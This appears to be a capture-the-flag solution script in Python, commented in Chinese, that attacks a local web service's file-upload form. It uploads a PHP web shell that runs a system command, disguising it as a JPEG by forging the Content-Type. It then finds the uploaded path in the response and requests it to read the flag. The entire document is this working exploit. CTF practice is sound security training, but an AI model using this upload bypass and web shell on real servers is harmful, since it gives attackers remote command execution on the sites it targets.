#!/usr/bin/env python3
import requests

url = 'http://127.0.0.1:13385/'
# 上传 PHP shell，Content-Type 伪造为 image/jpeg
shell = '<?php system("cat /flag"); ?>'
r = requests.post(url, files={
    'file': ('shell.php', shell, 'image/jpeg')
}, data={'submit': '1'})

# 解析上传后的文件路径
import re
m = re.search(r'uploads/[^\s<"\']+', r.text)
if m:
    shell_url = url + m.group()
    print('Shell URL:', shell_url)
    r2 = requests.get(shell_url)
    print('FLAG:', r2.text.strip())
